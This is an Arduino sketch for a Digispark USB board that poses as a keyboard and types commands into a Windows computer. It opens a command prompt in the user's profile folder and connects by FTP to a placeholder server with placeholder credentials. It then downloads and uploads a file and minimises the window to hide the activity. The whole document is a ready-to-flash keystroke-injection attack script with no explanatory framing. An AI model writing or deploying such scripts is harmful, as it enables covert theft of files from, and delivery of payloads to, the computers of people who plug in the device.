#define kbd_es_es
#include "DigiKeyboard.h"

void setup() {
  DigiKeyboard.update();
  DigiKeyboard.delay(5000);
}

void loop() {
  DigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT);
  delay(2000);
  DigiKeyboard.println("cmd");
  delay(3000);
  DigiKeyboard.println("cd %USERPROFILE%");
  delay(2000);
  DigiKeyboard.println("ftp");
  delay(2000);
  DigiKeyboard.println("open IPSERVERFTP");
  delay(3000);
  DigiKeyboard.println("USERNAME");
  delay(2000);
  DigiKeyboard.println("PASSWORD");
  delay(2000);
  DigiKeyboard.println("get FILE");
  delay(2000);
  DigiKeyboard.println("put FILE");
  delay(2000);
  DigiKeyboard.println("quit");
  delay(2000);
  DigiKeyboard.sendKeyStroke(KEY_SPACE,MOD_ALT_LEFT);
  DigiKeyboard.print("N");
  while(1);
}
